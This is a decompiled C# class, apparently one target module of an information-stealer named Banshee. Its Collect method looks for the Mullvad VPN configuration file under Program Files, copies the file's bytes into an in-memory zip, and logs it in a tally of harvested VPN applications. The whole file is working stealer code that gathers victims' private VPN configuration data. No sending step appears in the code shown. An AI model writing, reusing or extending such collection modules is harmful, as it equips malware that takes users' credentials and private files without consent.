﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x0200002E RID: 46
	public class MullVad : ITarget
	{
		// Token: 0x0600005F RID: 95 RVA: 0x00003F9C File Offset: 0x00003F9C
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\Program Files\\Mullvad VPN\\Configs\\Mullvad";
			if (File.Exists(text))
			{
				string text2 = ZipPath.Vpn("Mullvad");
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Mullvad";
				zip.AddFile(Path.Combine(text2, Path.GetFileName(text)), File.ReadAllBytes(text));
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
